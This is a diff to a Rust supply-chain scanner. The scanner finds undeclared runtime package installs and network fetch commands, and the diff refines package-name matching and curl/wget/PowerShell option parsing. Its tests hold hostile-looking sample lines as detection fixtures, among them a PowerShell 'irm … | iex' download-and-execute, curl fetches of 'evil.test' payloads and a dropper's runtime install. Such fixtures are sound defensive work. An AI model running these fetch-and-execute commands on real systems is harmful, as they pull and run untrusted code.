@@ -201,33 +201,50 @@ pub fn import_calls(file_type: &str, symbols: &[Symbol]) -> Vec<Reference> {
 /// lists. Only imperative package references ([`RefKind::Command`] — install
 /// commands and dynamic imports) are candidates; URL fetches and repository
 /// identity are out of scope. Declared and hunted are matched by package
-/// coordinate (ecosystem + name, version ignored), so a hunted `mobx` is
-/// cancelled by a declared `mobx@^6`.
+/// ([`package_key`]: ecosystem, namespace and name; version and qualifiers
+/// ignored), so a hunted `mobx` is cancelled by a declared
+/// `mobx?version_requirement=%5E6`.
 ///
 /// Pass the references for one package (root manifest + members) collected into
 /// a single slice; a per-file call cannot see the manifest's declarations.
 #[must_use]
 pub fn undeclared_packages(refs: &[Reference]) -> Vec<&Reference> {
-    let declared: std::collections::HashSet<&str> = refs
+    let declared: std::collections::HashSet<PackageKey> = refs
         .iter()
         .filter(|r| r.kind == RefKind::Dependency)
-        .filter_map(|r| purl_coordinate(&r.locator))
+        .filter_map(|r| package_key(&r.locator))
         .collect();
     refs.iter()
         .filter(|r| r.kind == RefKind::Command)
-        .filter(|r| purl_coordinate(&r.locator).is_some_and(|c| !declared.contains(c)))
+        .filter(|r| package_key(&r.locator).is_some_and(|k| !declared.contains(&k)))
         .collect()
 }
 
-/// A PURL's package coordinate — `pkg:<eco>/<name>` with any `@version` dropped,
-/// so the same package compares equal whether or not a version pin is attached.
-/// `None` for a non-PURL (URL) locator. A scoped npm name keeps its `%40` (an
-/// encoded `@`), so only a real version delimiter is stripped.
-fn purl_coordinate(loc: &RefLocator) -> Option<&str> {
-    match loc {
-        RefLocator::Purl(p) => Some(p.rsplit_once('@').map_or(p.as_str(), |(base, _)| base)),
-        RefLocator::Url(_) | RefLocator::Path(_) => None,
-    }
+/// `(type, namespace, name)`, as [`package_key`] derives it.
+type PackageKey = (String, Vec<String>, String);
+
+/// Which package a PURL locator names, independent of how it is spelled:
+/// parsed and canonicalized, so a declared `pkg:pypi/typing-extensions@4.9.0`
+/// and a hunted `pkg:pypi/typing_extensions` (PEP 503), or a literal and an
+/// encoded npm `@scope`, are the same package. A PURL that won't parse is keyed
+/// by its text before any version, so it can still match itself. `None` for a
+/// non-PURL (URL) locator.
+fn package_key(loc: &RefLocator) -> Option<PackageKey> {
+    let RefLocator::Purl(p) = loc else {
+        return None;
+    };
+    Some(match crate::purl::Purl::parse(p) {
+        Ok(purl) => (
+            purl.typ().to_string(),
+            purl.namespace().to_vec(),
+            purl.name().to_string(),
+        ),
+        Err(_) => {
+            let base = p.split(['?', '#']).next().unwrap_or(p);
+            let base = base.rsplit_once('@').map_or(base, |(b, _)| b);
+            (String::new(), Vec::new(), base.to_string())
+        }
+    })
 }
 
 /// Accumulator that carries the file text so each pushed reference gets a
@@ -438,11 +455,20 @@ fn import_locator(eco: &str, spec: &str) -> Option<(RefLocator, RefKind)> {
     }
     let purl = match eco {
         "npm" => {
-            let bare = spec.strip_prefix("node:").unwrap_or(spec);
-            if NODE_BUILTINS.contains(&bare) || HOST_PROVIDED_MODULES.contains(&bare) {
+            // `node:` names only builtins (some, like `node:test`, exist
+            // nowhere else), never a registry package.
+            if spec.starts_with("node:") {
                 return None;
             }
-            npm_purl_token(&npm_import_package(spec)?)?
+            // Judge the package a specifier resolves to, not its text: the
+            // builtin subpath `fs/promises` is still the builtin `fs`.
+            let package = npm_import_package(spec)?;
+            if NODE_BUILTINS.contains(&package.as_str())
+                || HOST_PROVIDED_MODULES.contains(&package.as_str())
+            {
+                return None;
+            }
+            npm_purl_token(&package)?
         }
         "pypi" => {
             let top = spec.split(['.', ':']).next()?;
@@ -625,58 +651,58 @@ const NODE_BUILTINS: &[&str] = &[
     "zlib",
 ];
 
-/// Common Python standard-library top-level modules — a dynamic
-/// `import_module("os")` is the runtime, not an external dependency.
+/// Python's standard-library top-level modules: `sys.stdlib_module_names` as of
+/// 3.14, plus the modules 3.12 and 3.13 removed, which code written for older
+/// interpreters still imports. A dynamic `import_module("csv")` is the runtime,
+/// not an external dependency; a PyPI project of the same name is a backport
+/// or a squat, and neither is what the code loads.
+#[rustfmt::skip]
 const PY_STDLIB: &[&str] = &[
-    "__future__",
-    "abc",
-    "argparse",
-    "asyncio",
-    "base64",
-    "builtins",
-    "collections",
-    "contextlib",
-    "copy",
-    "ctypes",
-    "datetime",
-    "functools",
-    "glob",
-    "gzip",
-    "hashlib",
-    "hmac",
-    "http",
-    "importlib",
-    "inspect",
-    "io",
-    "itertools",
-    "json",
-    "logging",
-    "math",
-    "os",
-    "pathlib",
-    "pickle",
-    "platform",
-    "queue",
-    "random",
-    "re",
-    "shutil",
-    "socket",
-    "ssl",
-    "string",
-    "struct",
-    "subprocess",
-    "sys",
-    "tempfile",
-    "threading",
-    "time",
-    "traceback",
-    "types",
-    "typing",
-    "urllib",
-    "uuid",
-    "warnings",
-    "zipfile",
-    "zlib",
+    "__future__", "_abc", "_aix_support", "_android_support", "_apple_support", "_ast",
+    "_ast_unparse", "_asyncio", "_bisect", "_blake2", "_bz2", "_codecs", "_codecs_cn",
+    "_codecs_hk", "_codecs_iso2022", "_codecs_jp", "_codecs_kr", "_codecs_tw",
+    "_collections", "_collections_abc", "_colorize", "_compat_pickle", "_contextvars",
+    "_csv", "_ctypes", "_curses", "_curses_panel", "_datetime", "_dbm", "_decimal",
+    "_elementtree", "_frozen_importlib", "_frozen_importlib_external", "_functools",
+    "_gdbm", "_hashlib", "_heapq", "_hmac", "_imp", "_interpchannels", "_interpqueues",
+    "_interpreters", "_io", "_ios_support", "_json", "_locale", "_lsprof", "_lzma",
+    "_markupbase", "_md5", "_multibytecodec", "_multiprocessing", "_opcode",
+    "_opcode_metadata", "_operator", "_osx_support", "_overlapped", "_pickle",
+    "_posixshmem", "_posixsubprocess", "_py_abc", "_py_warnings", "_pydatetime",
+    "_pydecimal", "_pyio", "_pylong", "_pyrepl", "_queue", "_random", "_remote_debugging",
+    "_scproxy", "_sha1", "_sha2", "_sha3", "_signal", "_sitebuiltins", "_socket",
+    "_sqlite3", "_sre", "_ssl", "_stat", "_statistics", "_string", "_strptime", "_struct",
+    "_suggestions", "_symtable", "_sysconfig", "_thread", "_threading_local", "_tkinter",
+    "_tokenize", "_tracemalloc", "_types", "_typing", "_uuid", "_warnings", "_weakref",
+    "_weakrefset", "_winapi", "_wmi", "_zoneinfo", "_zstd", "abc", "aifc", "annotationlib",
+    "antigravity", "argparse", "array", "ast", "asynchat", "asyncio", "asyncore", "atexit",
+    "audioop", "base64", "bdb", "binascii", "bisect", "builtins", "bz2", "cProfile",
+    "calendar", "cgi", "cgitb", "chunk", "cmath", "cmd", "code", "codecs", "codeop",
+    "collections", "colorsys", "compileall", "compression", "concurrent", "configparser",
+    "contextlib", "contextvars", "copy", "copyreg", "crypt", "csv", "ctypes", "curses",
+    "dataclasses", "datetime", "dbm", "decimal", "difflib", "dis", "distutils", "doctest",
+    "email", "encodings", "ensurepip", "enum", "errno", "faulthandler", "fcntl", "filecmp",
+    "fileinput", "fnmatch", "fractions", "ftplib", "functools", "gc", "genericpath",
+    "getopt", "getpass", "gettext", "glob", "graphlib", "grp", "gzip", "hashlib", "heapq",
+    "hmac", "html", "http", "idlelib", "imaplib", "imghdr", "imp", "importlib", "inspect",
+    "io", "ipaddress", "itertools", "json", "keyword", "lib2to3", "linecache", "locale",
+    "logging", "lzma", "mailbox", "mailcap", "marshal", "math", "mimetypes", "mmap",
+    "modulefinder", "msilib", "msvcrt", "multiprocessing", "netrc", "nis", "nntplib", "nt",
+    "ntpath", "nturl2path", "numbers", "opcode", "operator", "optparse", "os",
+    "ossaudiodev", "pathlib", "pdb", "pickle", "pickletools", "pipes", "pkgutil",
+    "platform", "plistlib", "poplib", "posix", "posixpath", "pprint", "profile", "pstats",
+    "pty", "pwd", "py_compile", "pyclbr", "pydoc", "pydoc_data", "pyexpat", "queue",
+    "quopri", "random", "re", "readline", "reprlib", "resource", "rlcompleter", "runpy",
+    "sched", "secrets", "select", "selectors", "shelve", "shlex", "shutil", "signal",
+    "site", "smtpd", "smtplib", "sndhdr", "socket", "socketserver", "spwd", "sqlite3",
+    "sre_compile", "sre_constants", "sre_parse", "ssl", "stat", "statistics", "string",
+    "stringprep", "struct", "subprocess", "sunau", "symtable", "sys", "sysconfig", "syslog",
+    "tabnanny", "tarfile", "telnetlib", "tempfile", "termios", "textwrap", "this",
+    "threading", "time", "timeit", "tkinter", "token", "tokenize", "tomllib", "trace",
+    "traceback", "tracemalloc", "tty", "turtle", "turtledemo", "types", "typing",
+    "unicodedata", "unittest", "urllib", "uu", "uuid", "venv", "warnings", "wave",
+    "weakref", "webbrowser", "winreg", "winsound", "wsgiref", "xdrlib", "xml", "xmlrpc",
+    "zipapp", "zipfile", "zipimport", "zlib", "zoneinfo",
 ];
 
 /// Recognize git source references — a `git clone <url>` command, or a
@@ -749,7 +775,7 @@ fn scan_shell(text: Option<&str>, source: &str, out: &mut Found<'_>) {
     commands(text, source, out);
     git_refs(text, source, out);
     urls(text, source, out);
-    bare_fetch_urls(text, source, &["curl", "curl.exe", "wget", "wget.exe"], out);
+    bare_fetch_urls(text, source, &[CURL, WGET], out);
 }
 
 /// Scan PowerShell web-cmdlet arguments for fetchable URLs. PowerShell's
@@ -764,56 +790,270 @@ fn scan_powershell(text: Option<&str>, source: &str, out: &mut Found<'_>) {
     // Keep explicit URLs tied to the whole command line so the fetch boundary
     // can recognize `irm https://… | iex` as a staged execution edge too.
     urls(text, source, out);
-    bare_fetch_urls(
-        text,
-        source,
-        &[
-            "irm",
-            "iwr",
-            "invoke-restmethod",
-            "invoke-webrequest",
-            "irm.exe",
-            "iwr.exe",
-        ],
-        out,
-    );
+    bare_fetch_urls(text, source, &[POWERSHELL_FETCH], out);
 }
 
 /// Find protocol-less host/path arguments to a known network fetch command.
 /// Explicit URLs remain owned by [`urls`], while this pass emits only the
 /// missing-scheme cases and normalizes them to HTTPS so the fetch boundary can
 /// parse and SSRF-check the resulting locator.
-fn bare_fetch_urls(text: &str, source: &str, commands: &[&str], out: &mut Found<'_>) {
+fn bare_fetch_urls(text: &str, source: &str, tools: &[FetchTool], out: &mut Found<'_>) {
     for line in text.lines() {
         let tokens: Vec<&str> = line.split_whitespace().collect();
         for (index, token) in tokens.iter().enumerate() {
             let command = token.trim_matches(|c| matches!(c, '\'' | '"' | '`' | '('));
-            if !commands
-                .iter()
-                .any(|candidate| command.eq_ignore_ascii_case(candidate))
-            {
+            let Some(tool) = tools.iter().find(|tool| {
+                tool.names
+                    .iter()
+                    .any(|name| command.eq_ignore_ascii_case(name))
+            }) else {
                 continue;
-            }
-            for argument in &tokens[index + 1..] {
-                let argument = argument
-                    .trim_matches(|c| matches!(c, '\'' | '"' | '`' | ')' | ']' | '}' | ',' | ';'));
-                if argument.starts_with('-') {
-                    continue;
-                }
-                if !looks_like_protocolless_url(argument) {
-                    continue;
-                }
+            };
+            if let Some(target) = tool.bare_target(&tokens[index + 1..]) {
                 out.push(
-                    RefLocator::Url(format!("https://{argument}")),
+                    RefLocator::Url(format!("https://{target}")),
                     RefKind::UrlFetch,
                     source,
                     line.trim(),
                 );
-                break;
             }
-            break;
         }
     }
+}
+
+/// A network fetch command, and which of its options take the next token as
+/// their value — so an option's value (`curl -o payload.sh`, `iwr -OutFile
+/// a.ps1`) is never mistaken for the host.
+struct FetchTool {
+    names: &'static [&'static str],
+    takes_value: fn(&str) -> bool,
+}
+
+const CURL: FetchTool = FetchTool {
+    names: &["curl", "curl.exe"],
+    takes_value: |opt| {
+        gnu_option_takes_value(
+            opt,
+            "AbcCdDeEFHKmoPQrtTuUwxXyYz",
+            &[
+                "alt-svc",
+                "cacert",
+                "capath",
+                "cert",
+                "config",
+                "connect-timeout",
+                "connect-to",
+                "continue-at",
+                "cookie",
+                "cookie-jar",
+                "create-file-mode",
+                "data",
+                "data-ascii",
+                "data-binary",
+                "data-raw",
+                "data-urlencode",
+                "dns-servers",
+                "dump-header",
+                "etag-compare",
+                "etag-save",
+                "form",
+                "form-string",
+                "header",
+                "hsts",
+                "interface",
+                "json",
+                "keepalive-time",
+                "key",
+                "limit-rate",
+                "local-port",
+                "max-filesize",
+                "max-redirs",
+                "max-time",
+                "netrc-file",
+                "noproxy",
+                "oauth2-bearer",
+                "output",
+                "output-dir",
+                "pass",
+                "preproxy",
+                "proto",
+                "proto-redir",
+                "proxy",
+                "proxy-user",
+                "range",
+                "referer",
+                "request",
+                "resolve",
+                "retry",
+                "retry-delay",
+                "retry-max-time",
+                "socks4",
+                "socks4a",
+                "socks5",
+                "socks5-hostname",
+                "speed-limit",
+                "speed-time",
+                "stderr",
+                "time-cond",
+                "trace",
+                "trace-ascii",
+                "upload-file",
+                "user",
+                "user-agent",
+                "variable",
+                "write-out",
+            ],
+        )
+    },
+};
+
+const WGET: FetchTool = FetchTool {
+    names: &["wget", "wget.exe"],
+    takes_value: |opt| {
+        gnu_option_takes_value(
+            opt,
+            "aABDeiIlOoPQRtTUwX",
+            &[
+                "accept",
+                "append-output",
+                "base",
+                "bind-address",
+                "body-data",
+                "body-file",
+                "ca-certificate",
+                "certificate",
+                "config",
+                "connect-timeout",
+                "default-page",
+                "directory-prefix",
+                "dns-timeout",
+                "domains",
+                "execute",
+                "exclude-directories",
+                "exclude-domains",
+                "ftp-password",
+                "ftp-user",
+                "header",
+                "http-password",
+                "http-user",
+                "include-directories",
+                "input-file",
+                "level",
+                "limit-rate",
+                "load-cookies",
+                "local-encoding",
+                "method",
+                "output-document",
+                "output-file",
+                "password",
+                "post-data",
+                "post-file",
+                "private-key",
+                "quota",
+                "read-timeout",
+                "referer",
+                "reject",
+                "rejected-log",
+                "remote-encoding",
+                "save-cookies",
+                "timeout",
+                "tries",
+                "user",
+                "user-agent",
+                "wait",
+                "waitretry",
+            ],
+        )
+    },
+};
+
+const POWERSHELL_FETCH: FetchTool = FetchTool {
+    names: &[
+        "irm",
+        "iwr",
+        "invoke-restmethod",
+        "invoke-webrequest",
+        "irm.exe",
+        "iwr.exe",
+    ],
+    takes_value: powershell_option_takes_value,
+};
+
+impl FetchTool {
+    /// The first protocol-less host/path argument, skipping options and the
+    /// values they take, and stopping where the command ends (a separator or
+    /// redirection) so a later command's arguments or an output file aren't
+    /// read as this one's.
+    fn bare_target<'a>(&self, args: &[&'a str]) -> Option<&'a str> {
+        let mut args = args.iter();
+        while let Some(raw) = args.next() {
+            if matches!(*raw, "|" | "||" | "&&" | "&" | ";")
+                || raw.starts_with(['>', '<'])
+                || raw.starts_with("1>")
+                || raw.starts_with("2>")
+            {
+                return None;
+            }
+            let arg =
+                raw.trim_matches(|c| matches!(c, '\'' | '"' | '`' | ')' | ']' | '}' | ',' | ';'));
+            if arg.starts_with('-') {
+                if (self.takes_value)(arg) {
+                    args.next();
+                }
+            } else if looks_like_protocolless_url(arg) {
+                return Some(arg);
+            }
+            if raw.ends_with(';') {
+                return None;
+            }
+        }
+        None
+    }
+}
+
+/// Whether a GNU-style option consumes the next token. A long option does when
+/// it is listed and has no `=value` attached. In a short cluster the first
+/// value-taking letter takes the rest of the cluster as its value (`-ofile`),
+/// or, when it ends the cluster, the next token (`-fsSLo file`).
+fn gnu_option_takes_value(opt: &str, short: &str, long: &[&str]) -> bool {
+    if let Some(name) = opt.strip_prefix("--") {
+        return !name.contains('=') && long.contains(&name);
+    }
+    let cluster = opt.trim_start_matches('-');
+    cluster
+        .char_indices()
+        .find(|&(_, c)| short.contains(c))
+        .is_some_and(|(i, c)| i + c.len_utf8() == cluster.len())
+}
+
+/// Whether an `Invoke-WebRequest`/`Invoke-RestMethod` parameter consumes the
+/// next token. Every parameter takes a value except the switches, matched by
+/// prefix since PowerShell accepts any unambiguous abbreviation. `-Uri`'s
+/// value is the target itself, so it is left to be scanned; `-Name:value`
+/// carries its own.
+fn powershell_option_takes_value(opt: &str) -> bool {
+    const SWITCHES: &[&str] = &[
+        "allowinsecureredirect",
+        "allowunencryptedauthentication",
+        "disablekeepalive",
+        "noproxy",
+        "passthru",
+        "preserveauthorizationonredirect",
+        "preservehttpmethodonredirect",
+        "proxyusedefaultcredentials",
+        "resume",
+        "skipcertificatecheck",
+        "skipheadervalidation",
+        "skiphttperrorcheck",
+        "usebasicparsing",
+        "usedefaultcredentials",
+    ];
+    let name = opt.trim_start_matches('-');
+    if name.is_empty() || name.contains(':') {
+        return false;
+    }
+    let name = name.to_ascii_lowercase();
+    !"uri".starts_with(&name) && !SWITCHES.iter().any(|switch| switch.starts_with(&name))
 }
 
 /// A conservative host/path check used only after a recognized fetch command.
@@ -1492,6 +1732,104 @@ mod tests {
         assert!(url_refs.contains(&"https://evil.test/stage2.sh"));
     }
 
+    /// The `UrlFetch` locators hunted from `bytes`, read as `name`.
+    fn fetched_urls(bytes: &[u8], name: &str) -> Vec<String> {
+        references_in_bytes(bytes, name)
+            .into_iter()
+            .filter(|r| r.kind == RefKind::UrlFetch)
+            .filter_map(|r| match r.locator {
+                RefLocator::Url(u) => Some(u),
+                RefLocator::Purl(_) | RefLocator::Path(_) => None,
+            })
+            .collect()
+    }
+
+    #[test]
+    fn an_options_value_is_not_a_host() {
+        // Each output filename has a dot and a plausible TLD (`.sh`, `.py` and
+        // `.exe` would all pass the host check), so only option parsing keeps
+        // it from becoming a fetch of `https://payload.sh`.
+        for (script, want) in [
+            ("curl -o payload.sh https://evil.test/p\n", None),
+            (
+                "wget -O setup.exe example.com/x\n",
+                Some("https://example.com/x"),
+            ),
+            (
+                "curl -fsSLo install.py example.com/x\n",
+                Some("https://example.com/x"),
+            ),
+            (
+                "curl -oinstall.py example.com/x\n",
+                Some("https://example.com/x"),
+            ),
+            (
+                "curl --output=a.sh example.com/x\n",
+                Some("https://example.com/x"),
+            ),
+            (
+                "curl --output a.sh example.com/x\n",
+                Some("https://example.com/x"),
+            ),
+            (
+                "curl -H x-api.key example.com/x\n",
+                Some("https://example.com/x"),
+            ),
+            // A redirection target is a file, not an argument.
+            ("curl -s \"$U\" > install.sh\n", None),
+            ("wget -qO- \"$U\" >install.sh\n", None),
+        ] {
+            let got = fetched_urls(script.as_bytes(), "install.sh");
+            let bare: Vec<_> = got.iter().filter(|u| !u.contains("evil.test")).collect();
+            assert_eq!(
+                bare.first().map(|u| u.as_str()),
+                want,
+                "{script:?}: {got:?}"
+            );
+            assert_eq!(
+                bare.len(),
+                usize::from(want.is_some()),
+                "{script:?}: {got:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn each_fetch_command_on_a_line_is_scanned_on_its_own() {
+        // The first command's scan stops at `&&` instead of running into the
+        // second's arguments, and the second is then scanned too.
+        let got = fetched_urls(b"curl -o a.sh a.example/x && wget b.example/y\n", "x.sh");
+        assert!(got.contains(&"https://a.example/x".to_string()), "{got:?}");
+        assert!(got.contains(&"https://b.example/y".to_string()), "{got:?}");
+        assert!(!got.iter().any(|u| u.contains("a.sh")), "{got:?}");
+    }
+
+    #[test]
+    fn powershell_parameters_take_values_except_switches() {
+        for (script, want) in [
+            (
+                "iwr -OutFile a.ps1 example.com/x\n",
+                "https://example.com/x",
+            ),
+            (
+                "iwr -UseBasicParsing example.com/x\n",
+                "https://example.com/x",
+            ),
+            ("iwr -UseB example.com/x\n", "https://example.com/x"), // abbreviated switch
+            (
+                "Invoke-WebRequest -Uri example.com/x -OutFile a.ps1\n",
+                "https://example.com/x",
+            ),
+            (
+                "iwr -OutFile:a.ps1 example.com/x\n",
+                "https://example.com/x",
+            ),
+        ] {
+            let got = fetched_urls(script.as_bytes(), "stage.ps1");
+            assert_eq!(got, [want], "{script:?}");
+        }
+    }
+
     #[test]
     fn bare_urls_in_fetch_commands_become_fetchable_references() {
         let powershell = b"irm cdn.jsdelivr.net/gh/example/stage.ps1 | iex\n";
@@ -2103,6 +2441,28 @@ mod tests {
     }
 
     #[test]
+    fn builtin_subpaths_and_stdlib_modules_are_not_registry_packages() {
+        // Each of these names a runtime module whose registry namesake, if any,
+        // is someone else's package.
+        let js = b"async function load(){\n\
+            await import(\"fs/promises\");\n\
+            await import(\"stream/web\");\n\
+            await import(\"node:test\");\n\
+            return import(\"left-pad/lib\");\n}\n";
+        let purls = purls_of(&references_in_bytes(js, "loader.mjs"));
+        assert_eq!(purls, ["pkg:npm/left-pad"], "only the real package");
+
+        let py = b"import importlib\n\
+            importlib.import_module(\"csv\")\n\
+            importlib.import_module(\"sqlite3\")\n\
+            importlib.import_module(\"concurrent.futures\")\n\
+            importlib.import_module(\"imp\")\n\
+            importlib.import_module(\"requests\")\n";
+        let purls = purls_of(&references_in_bytes(py, "plugin.py"));
+        assert_eq!(purls, ["pkg:pypi/requests"], "only the real package");
+    }
+
+    #[test]
     fn recognizes_python_importlib_dynamic_import() {
         let py = b"import importlib\n\
             mod = importlib.import_module(\"evil_telemetry\")\n\
@@ -2247,21 +2607,52 @@ mod tests {
         );
     }
 
+    /// The locator text of each reference, for asserting on a result set.
+    fn locators<'a>(refs: &[&'a Reference]) -> Vec<&'a str> {
+        refs.iter()
+            .map(|r| match &r.locator {
+                RefLocator::Purl(s) | RefLocator::Url(s) | RefLocator::Path(s) => s.as_str(),
+            })
+            .collect()
+    }
+
     #[test]
     fn undeclared_packages_diffs_hunted_against_declared() {
         // db-xorma's aggregated refs: mobx/oubliette declared; the dropper's
-        // runtime install of db-dx-connector is hunted but undeclared.
+        // runtime install of db-dx-connector is hunted but undeclared. The
+        // declared ranges are spelled as filefacts emits them: a
+        // `version_requirement` qualifier, not a version.
         let refs = vec![
-            pkg_ref(RefKind::Dependency, "pkg:npm/mobx@^6.0.0"),
-            pkg_ref(RefKind::Dependency, "pkg:npm/oubliette@^1.0.2"),
+            pkg_ref(
+                RefKind::Dependency,
+                "pkg:npm/mobx?version_requirement=%5E6.0.0",
+            ),
+            pkg_ref(
+                RefKind::Dependency,
+                "pkg:npm/oubliette?version_requirement=%5E1.0.2",
+            ),
             pkg_ref(RefKind::Command, "pkg:npm/mobx"), // declared → not flagged
             pkg_ref(RefKind::Command, "pkg:npm/db-dx-connector"),
         ];
-        let undeclared: Vec<_> = undeclared_packages(&refs)
-            .iter()
-            .filter_map(|r| purl_coordinate(&r.locator))
-            .collect();
-        assert_eq!(undeclared, ["pkg:npm/db-dx-connector"]);
+        assert_eq!(
+            locators(&undeclared_packages(&refs)),
+            ["pkg:npm/db-dx-connector"]
+        );
+    }
+
+    #[test]
+    fn undeclared_packages_compare_canonical_names() {
+        let refs = vec![
+            // filefacts PEP 503-normalizes declared PyPI names.
+            pkg_ref(RefKind::Dependency, "pkg:pypi/typing-extensions@4.9.0"),
+            pkg_ref(RefKind::Command, "pkg:pypi/typing_extensions"),
+            // A literal `@` scope is the same package as an encoded one.
+            pkg_ref(RefKind::Dependency, "pkg:npm/%40scope/a@1.0.0"),
+            pkg_ref(RefKind::Command, "pkg:npm/@scope/a"),
+            // A different package in the same scope is not cancelled by it.
+            pkg_ref(RefKind::Command, "pkg:npm/@scope/b"),
+        ];
+        assert_eq!(locators(&undeclared_packages(&refs)), ["pkg:npm/@scope/b"]);
     }
 
     #[test]
@@ -2281,11 +2672,7 @@ mod tests {
             },
             pkg_ref(RefKind::Command, "pkg:pypi/evil"),
         ];
-        let got: Vec<_> = undeclared_packages(&refs)
-            .iter()
-            .filter_map(|r| purl_coordinate(&r.locator))
-            .collect();
-        assert_eq!(got, ["pkg:pypi/evil"]);
+        assert_eq!(locators(&undeclared_packages(&refs)), ["pkg:pypi/evil"]);
     }
 
     #[test]
